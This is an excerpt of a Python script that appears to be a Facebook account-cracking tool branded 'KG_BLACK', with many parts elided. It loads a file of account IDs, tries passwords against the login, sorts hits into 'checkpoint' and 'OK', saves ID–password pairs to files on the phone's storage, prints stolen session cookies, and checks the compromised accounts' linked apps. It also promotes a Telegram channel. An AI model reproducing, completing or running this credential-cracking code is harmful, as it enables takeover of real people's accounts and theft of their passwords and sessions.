...
os.system('clear')
print(logo)
os.system('espeak -a 300 " Join My telegram, surchy_cracker, For New update,"')
time.sleep(2)
os.system(f'xdg-open https://t.me/SURCHY_CRACKER')
time.sleep(2)
uname =input(' Click Enter For Cracked...')
os.system('espeak -a 300 " Welcome Tool, kg_black, Crack Facebook, File Clone"')
pass
def login():
    try:
...
NameX =input(' WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
 #===©===#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
...
def crack_file():
    os.system('espeak -a 300 " Put File Name"')
    o = input('\033[1;37m Put File Name :\033[1;37m ')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{hh} 𝐊𝐆_𝐁𝐋𝐀𝐂𝐊 {P}<{b}{loop}{P}/{u}{len(id)}{P}> {P}[{H}{ok}{P}] {P}[{k}{cp}{x}] [{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r {m}[𝐊𝐆_𝐁𝐋𝐀𝐂𝐊-𝘾𝙋] {idf} | {pw}')
				open('/sdcard/𝐊𝐆_𝐁𝐋𝐀𝐂𝐊-CP.txt','a').write(idf+' • '+pw+'\n')
				os.system('espeak -a 300 " Cracked, cp ,KG_BLACK"')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				print(f'\r {hh}[𝐊𝐆_𝐁𝐋𝐀𝐂𝐊-𝙊𝙆] {idf} | {pw}\n{kuki}')
				open('/sdcard/𝐊𝐆_𝐁𝐋𝐀𝐂𝐊-Ok.txt','a').write(idf+' • '+pw+'\n')
				os.system('espeak -a 300 " Cracked, ok ,KG_BLACK"')
				cek_NIK(kuki)
				break
			else:
				continue
...
def cek_NIK(kuki):
 ...
 try:
  for i in range(len(game)):
   print ("\r%s  \033[0m 𝐗 ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
 except AttributeError:
